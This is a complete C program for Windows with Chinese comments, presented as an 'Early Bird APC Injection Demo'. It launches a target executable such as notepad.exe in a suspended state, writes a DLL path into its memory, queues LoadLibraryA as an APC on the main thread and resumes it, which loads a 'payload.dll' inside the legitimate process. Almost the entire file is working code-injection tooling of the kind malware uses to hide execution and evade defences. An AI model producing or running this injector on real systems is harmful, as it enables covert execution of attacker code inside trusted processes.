#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

// Early Bird APC注入函数
BOOL EarlyBirdAPCInjection(const char* targetPath, const char* dllPath) {
    STARTUPINFOA si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    PVOID pRemoteMemory = NULL;
    PVOID pLoadLibraryA = NULL;
    SIZE_T pathLen = 0;
    BOOL result = FALSE;

    si.cb = sizeof(STARTUPINFOA);

    printf("[*] Creating suspended process: %s\n", targetPath);

    // 创建挂起的进程（CREATE_SUSPENDED标志）
    if (!CreateProcessA(
        NULL,                           // 应用程序名（使用命令行）
        (LPSTR)targetPath,              // 命令行
        NULL,                           // 进程安全属性
        NULL,                           // 线程安全属性
        FALSE,                          // 句柄继承
        CREATE_SUSPENDED,               // 创建标志：挂起主线程
        NULL,                           // 环境变量
        NULL,                           // 当前目录
        &si,                            // 启动信息
        &pi                             // 进程信息
    )) {
        printf("[ERROR] Failed to create suspended process (Error: %d)\n", GetLastError());
        return FALSE;
    }

    printf("[+] Successfully created suspended process (PID: %d, TID: %d)\n",
        pi.dwProcessId, pi.dwThreadId);

    // 获取DLL路径长度
    pathLen = strlen(dllPath) + 1;

    // 在目标进程中分配内存用于存储DLL路径
    pRemoteMemory = VirtualAllocEx(
        pi.hProcess,                    // 目标进程句柄
        NULL,                           // 自动分配地址
        pathLen,                        // 大小
        MEM_COMMIT | MEM_RESERVE,       // 分配类型
        PAGE_READWRITE                 // 内存保护
    );

    if (pRemoteMemory == NULL) {
        printf("[ERROR] Failed to allocate memory in target process (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully allocated memory in target process (Address: 0x%p)\n", pRemoteMemory);

    // 将DLL路径写入目标进程
    if (!WriteProcessMemory(
        pi.hProcess,                    // 目标进程句柄
        pRemoteMemory,                  // 目标地址
        (LPVOID)dllPath,                // 源数据
        pathLen,                        // 大小
        NULL                            // 写入字节数（可选）
    )) {
        printf("[ERROR] Failed to write DLL path to target process (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully wrote DLL path to target process\n");

    // 获取LoadLibraryA的地址（在kernel32.dll中，所有进程共享）
    pLoadLibraryA = (PVOID)GetProcAddress(
        GetModuleHandleA("kernel32.dll"),
        "LoadLibraryA"
    );

    if (pLoadLibraryA == NULL) {
        printf("[ERROR] Failed to get LoadLibraryA address\n");
        goto cleanup;
    }

    printf("[+] LoadLibraryA address: 0x%p\n", pLoadLibraryA);

    // 将APC排队到挂起的主线程
    // 当线程恢复时，如果处于可警告状态，APC会被执行
    if (QueueUserAPC(
        (PAPCFUNC)pLoadLibraryA,        // APC函数（LoadLibraryA）
        pi.hThread,                     // 目标线程句柄
        (ULONG_PTR)pRemoteMemory        // APC参数（DLL路径地址）
    ) == 0) {
        printf("[ERROR] Failed to queue APC to target thread (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Successfully queued APC to suspended thread\n");
    printf("[*] Resuming thread...\n");

    // 恢复线程执行
    // 当线程恢复时，如果进入可警告状态，APC会被执行
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[ERROR] Failed to resume thread (Error: %d)\n", GetLastError());
        goto cleanup;
    }

    printf("[+] Thread resumed successfully\n");
    printf("[+] Early Bird APC injection completed!\n");
    printf("[*] The DLL should be loaded when the thread enters alertable state\n");

    result = TRUE;

cleanup:
    // 关闭句柄（注意：不要关闭进程句柄，让进程继续运行）
    if (pi.hThread != NULL) {
        CloseHandle(pi.hThread);
    }
    // 进程句柄可以关闭，不会终止进程
    if (pi.hProcess != NULL) {
        CloseHandle(pi.hProcess);
    }

    return result;
}

int main(int argc, char* argv[]) {
    // 设置控制台代码页为UTF-8
    SetConsoleOutputCP(65001);
    SetConsoleCP(65001);

    char targetPath[MAX_PATH] = { 0 };
    char dllPath[MAX_PATH] = { 0 };

    printf("=== Early Bird APC Injection Demo ===\n\n");

    // 检查命令行参数
    if (argc < 3) {
        printf("Usage: %s <target_exe_path> <dll_path>\n", argv[0]);
        printf("Example: %s target.exe payload.dll\n", argv[0]);
        printf("Example: %s C:\\Windows\\System32\\notepad.exe payload.dll\n", argv[0]);
        return 1;
    }

    // 获取目标程序路径
    strncpy(targetPath, argv[1], MAX_PATH - 1);
    targetPath[MAX_PATH - 1] = '\0';

    // 获取DLL路径（如果是相对路径，转换为绝对路径）
    if (GetFullPathNameA(argv[2], MAX_PATH, dllPath, NULL) == 0) {
        printf("[ERROR] Failed to get full path of DLL: %s\n", argv[2]);
        return 1;
    }

    printf("[*] Target executable: %s\n", targetPath);
    printf("[*] DLL to inject: %s\n", dllPath);
    printf("\n");

    // 检查DLL文件是否存在
    if (GetFileAttributesA(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[ERROR] DLL file not found: %s\n", dllPath);
        return 1;
    }

    // 执行Early Bird APC注入
    if (EarlyBirdAPCInjection(targetPath, dllPath)) {
        printf("\n[SUCCESS] Early Bird APC injection completed!\n");
        printf("[TIP] The target process should now be running with the DLL injected\n");
        return 0;
    }
    else {
        printf("\n[FAILED] Early Bird APC injection failed!\n");
        return 1;
    }
}

